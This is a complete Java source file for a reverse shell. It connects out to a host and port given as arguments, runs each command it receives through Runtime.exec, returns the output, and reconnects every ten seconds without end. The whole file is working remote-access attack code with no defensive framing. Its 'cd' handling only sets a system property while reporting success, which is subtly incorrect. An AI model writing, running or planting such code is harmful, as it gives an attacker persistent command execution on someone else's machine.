import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;

public class ReverseShell {
    public static void main(String[] args) {
        if (args.length < 2) {
            System.out.println("ReverseShell.jar <host> <port>");
        } else {
            String host = args[0];
            int port = Integer.parseInt(args[1]);
            reverseShell(host, port);
        }
    }

    private static void reverseShell(String host, int port) {
        while (true) {
            try (Socket s = new Socket(host, port);
                 BufferedReader in = new BufferedReader(new InputStreamReader(s.getInputStream()));
                 OutputStream out = s.getOutputStream()) {

                while (true) {
                    String command = in.readLine();
                    if (command == null || command.equals("exit")) {
                        break;
                    }

                    if (command.startsWith("cd")) {
                        try {
                            String dir = command.substring(3).trim();
                            System.setProperty("user.dir", dir);
                            out.write("Directory changed successfully\n".getBytes(StandardCharsets.UTF_8));
                        } catch (Exception e) {
                            out.write(("Error changing directory: " + e.toString() + "\n").getBytes(StandardCharsets.UTF_8));
                        }
                    } else {
                        try {
                            Process p = Runtime.getRuntime().exec(command);
                            InputStream input = p.getInputStream();
                            InputStream error = p.getErrorStream();
                            byte[] buffer = new byte[1024];
                            int n;
                            while ((n = input.read(buffer)) != -1) {
                                out.write(buffer, 0, n);
                            }
                            while ((n = error.read(buffer)) != -1) {
                                out.write(buffer, 0, n);
                            }
                            out.flush();
                        } catch (Exception e) {
                            out.write(("Error executing command: " + e.toString() + "\n").getBytes(StandardCharsets.UTF_8));
                        }
                    }
                }
            } catch (IOException e) {
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException ex) {
                    // ignore
                }
            }
        }
    }
}
